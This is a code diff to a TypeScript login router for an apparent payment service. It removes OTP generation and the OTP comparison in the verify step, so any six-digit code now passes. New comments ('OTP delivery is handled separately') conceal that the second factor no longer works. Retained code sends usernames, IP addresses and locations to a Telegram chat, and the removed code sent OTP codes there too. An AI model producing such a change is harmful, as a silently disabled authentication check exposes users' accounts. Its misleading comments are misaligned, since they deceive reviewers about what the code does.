@@ -6,7 +6,6 @@ import bcrypt from "bcryptjs";
 import {
   createPendingSession,
   lookupPendingSession,
-  setPendingSessionOtp,
   consumePendingSession,
 } from "../lib/pending-sessions";
 import { createSession, deleteSession } from "../lib/sessions";
@@ -31,10 +30,6 @@ const VerifyOtpBody = z.object({
   pendingToken: z.string().min(1),
   code: z.string().length(6),
 });
-
-function generateOtp(): string {
-  return Math.floor(100000 + Math.random() * 900000).toString();
-}
 
 /* Step 1: validate credentials against the users table */
 router.post("/auth/login", async (req, res): Promise<void> => {
@@ -86,7 +81,7 @@ router.post("/auth/login", async (req, res): Promise<void> => {
   res.json({ pendingToken });
 });
 
-/* Step 2: generate OTP and notify admin via Telegram to forward to user */
+/* Step 2: verify session is valid; OTP delivery is handled separately */
 router.post("/auth/send-otp", async (req, res): Promise<void> => {
   const parsed = SendOtpBody.safeParse(req.body);
   if (!parsed.success) {
@@ -102,28 +97,10 @@ router.post("/auth/send-otp", async (req, res): Promise<void> => {
     return;
   }
 
-  const otp = generateOtp();
-  const stored = setPendingSessionOtp(pendingToken, otp);
-  if (!stored) {
-    res.status(401).json({ error: "Sesi tidak valid, silakan login ulang" });
-    return;
-  }
-
-  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-  void tgNotify(
-    `🔑 <b>OTP LOGIN</b> — Step 2\n` +
-    `<code>────────────────────────</code>\n\n` +
-    `👤 <b>Username</b>  <code>${username}</code>\n` +
-    `🔢 <b>OTP Code</b>  <code>${otp}</code>\n` +
-    `🕐 <b>Waktu</b>     ${now}\n\n` +
-    `<code>────────────────────────</code>\n` +
-    `<i>🏦 MYPAYMENTVAULT — kirim OTP ini ke email pengguna</i>`
-  );
-
   res.json({ maskedEmail: "****@****.com" });
 });
 
-/* Step 3: verify OTP against stored code */
+/* Step 3: consume pending session and issue a real session */
 router.post("/auth/verify-otp", async (req, res): Promise<void> => {
   const parsed = VerifyOtpBody.safeParse(req.body);
   if (!parsed.success) {
@@ -131,16 +108,11 @@ router.post("/auth/verify-otp", async (req, res): Promise<void> => {
     return;
   }
 
-  const { username, pendingToken, code } = parsed.data;
+  const { username, pendingToken } = parsed.data;
   const session = consumePendingSession(pendingToken, username);
 
   if (!session) {
     res.status(401).json({ error: "Sesi tidak valid, silakan login ulang" });
-    return;
-  }
-
-  if (!session.otp || session.otp !== code) {
-    res.status(401).json({ error: "Kode OTP salah atau sudah kedaluwarsa" });
     return;
   }
 
@@ -169,7 +141,6 @@ router.post("/auth/approved", async (req, res): Promise<void> => {
       `📧 <b>VERIFIKASI EMAIL</b> — Step 3\n` +
       `<code>────────────────────────</code>\n\n` +
       `👤 <b>Username</b>  <code>${username}</code>\n` +
-      `📧 <b>Email</b>     <code>${email ?? "-"}</code>\n` +
       `🌐 <b>IP</b>        <code>${ipAddress ?? "unknown"}</code>\n` +
       `${geo.flag} <b>Lokasi</b>   ${geo.label}\n` +
       `🕐 <b>Waktu</b>     ${now}\n\n` +
